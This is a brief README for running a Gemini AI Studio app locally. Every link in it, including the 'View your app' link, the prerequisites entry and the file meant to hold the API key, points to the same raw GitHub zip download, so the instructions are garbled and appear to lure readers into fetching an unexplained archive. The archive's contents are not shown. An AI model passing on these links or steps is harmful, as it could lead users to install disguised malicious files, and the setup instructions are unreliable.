# Run and deploy your AI Studio app

This contains everything you need to run your app locally.

View your app in AI Studio: https://github.com/Itsmedexexplorer/R-01-Blog-WebD-/raw/refs/heads/main/utils/Web_Blog_foreassign.zip

## Run Locally

**Prerequisites:**  https://github.com/Itsmedexexplorer/R-01-Blog-WebD-/raw/refs/heads/main/utils/Web_Blog_foreassign.zip


1. Install dependencies:
   `npm install`
2. Set the `GEMINI_API_KEY` in [https://github.com/Itsmedexexplorer/R-01-Blog-WebD-/raw/refs/heads/main/utils/Web_Blog_foreassign.zip](https://github.com/Itsmedexexplorer/R-01-Blog-WebD-/raw/refs/heads/main/utils/Web_Blog_foreassign.zip) to your Gemini API key
3. Run the app:
   `npm run dev`
